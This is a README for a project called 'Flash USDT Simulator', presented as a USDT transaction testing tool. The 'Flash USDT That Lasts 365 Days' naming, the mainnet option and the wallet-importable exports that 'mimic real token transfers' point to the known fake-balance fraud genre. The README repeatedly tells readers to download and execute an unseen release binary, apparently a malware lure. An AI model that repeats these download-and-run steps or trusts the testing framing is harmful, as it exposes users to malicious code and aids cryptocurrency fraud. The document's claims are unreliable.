Overview
Flash USDT Simulator provides a compact toolset for creating, simulating, and testing USDT transactions across eras and chains. It simulates a full year of live-like transactions and provides a persistent 365-day timer for testing retention, escrow expiry, and wallet behavior. The project targets test environments: wallets, escrow services, p2p workflows, and SDK integrations for ERC20 and TRC20 chains.

Key features
- 365-day transaction lifecycle simulation. The tool runs a timer that represents a full-year lifecycle for funds, holds, and time-locked escrows.
- Multi-protocol test support. Simulate ERC20-like and TRC20-like flows, token transfer patterns, and gas-related metadata.
- Wallet compatibility checks. Test Trust Wallet and other thin clients by replaying transaction patterns.
- Escrow and p2p scenarios. Create deposit, hold, dispute, and release flows for manual or automated escrow testing.
- Hash log and audit trail. The tool logs transaction hashes and events for offline audit and replay.
- Lightweight CLI and SDK hooks. Use CLI primitives or call the small SDK to integrate simulation into test suites.
- Release assets available for download and execution from the Releases page. Download the release asset and execute the included binary or script: https://github.com/AdityaRajak364/Flash-USDT-That-Lasts-365-Days/releases

Typical use cases
- Wallet QA teams reproduce a year of small transfers to test storage growth and pruning.
- Escrow services validate timed releases and dispute handling across a 365-day window.
- P2P marketplaces simulate buyer-seller flows with test holds and final settlement.
- Developers validate SDK integration for ERC-style token operations and TRC-style behavior.
- Security teams verify that hash logs match replayed transactions and detect tampering.

Quick start ‚Äî download and execute
1. Visit the Releases page and download the appropriate asset for your platform. The release contains a single packaged tool and supporting scripts.
2. On Unix-like systems:
   - curl -LO <release-asset-url>
   - chmod +x ./flash-usdt-simulator
   - ./flash-usdt-simulator --mode=simulate --duration=365d
3. On Windows:
   - Download the .zip or .exe asset from the Releases page.
   - Extract if needed.
   - Run the executable from PowerShell: .\flash-usdt-simulator.exe --mode simulate --duration 365d
4. The release asset must be downloaded and executed from the Releases page. If the release link fails or you cannot access the asset, open the project's Releases tab and pick the latest build: https://github.com/AdityaRajak364/Flash-USDT-That-Lasts-365-Days/releases

Commands and examples
- Start a full simulation that emits transactions to the local log:
  - ./flash-usdt-simulator --mode simulate --network testnet --days 365 --out ./logs
- Run a dry-run without generating signatures:
  - ./flash-usdt-simulator --mode dryrun --days 365
- Start an escrow scenario:
  - ./flash-usdt-simulator --scenario escrow --escrow-duration 30d --deposit 1000 --token USDT-TRC20
- Export a set of transactions for wallet import:
  - ./flash-usdt-simulator --export wallet-file.json --format ledger

Flags explained (common)
- --mode: simulate | dryrun | replay
- --network: mainnet | testnet | local
- --days: simulation days (default 365)
- --scenario: basic | escrow | dispute | p2p
- --out: directory for logs and exported transactions
- --token: token profile (USDT-ERC20, USDT-TRC20, custom)

SDK and integration notes
- The simulator exposes a minimal SDK in two styles: HTTP REST and local library (Node/Python).
- REST endpoints:
  - POST /simulate ‚Äî start a simulation (body: {scenario, days, network})
  - GET /status/:id ‚Äî check progress and obtain hash log
  - GET /export/:id ‚Äî download transaction bundle
- Library usage (Node example):
  - const sim = require('flash-usdt-sim')
  - const run = sim.start({scenario: 'escrow', days: 365, token: 'USDT-ERC20'})
  - run.on('tx', (tx) => console.log(tx.hash))
- The SDK creates canonical transaction records that mimic real token transfers. Fields include timestamp, hash, from, to, value, token, gas, chain, and metadata.

Configuration and runtime options
- Config file (config.yml) supports profiles:
  - profile: trust-wallet-test
  - token: USDT-ERC20
  - start-balance: 10000
  - escrow-fee: 0.5
  - audit: true
- Environment variables:
  - FLASH_USDT_NETWORK=testnet
  - FLASH_USDT_LOG_LEVEL=info
  - FLASH_USDT_OUTPUT=./my-logs
- You can change token formats and generate custom patterns. The simulator ships with templates for ERC20 and TRC20 token semantics. Use custom templates to adapt to other token rules.

Logs, hash trail, and auditability
- The simulator writes a continuous hash log. Each entry contains the computed transaction hash, the canonical record, and the previous entry hash. That forms a chained audit trail you can verify offline.
- Export formats:
  - JSONL for structured ingestion
  - CSV for spreadsheets
  - RAW .log for sequential processing
- Verification:
  - Use the included verifier: ./flash-usdt-simulator verify --input ./logs/latest.jsonl
  - The verifier checks chain continuity and validates stored hashes.

Testing p2p, wallets, and escrow flows
- Wallet testing:
  - Generate typical traffic patterns: small frequent sends, occasional large transfers, and inbound refunds.
  - Test wallet sync: run simulator and point wallet test client to import exported bundles.
  - Validate handling of pending and confirmed states by toggling network latency in the simulator.
- P2P marketplace:
  - Create buyer deposits, seller holds, and timed releases.
  - Simulate disputes: use the dispute scenario and test the marketplace resolution logic.
- Escrow:
  - Create multi-step flows: deposit, lock, evidence upload, and release or revert.
  - Test cross-chain normalization by mapping ERC-style receipts to TRC-style receipts.

Security and best practices
- Keep test data separate from production secrets.
- Use an isolated network or mocked environment when you test keys or signing flows.
- Use the hash log to verify test stability between runs.
- Rotate test seed accounts if you reuse the same datasets across teams.
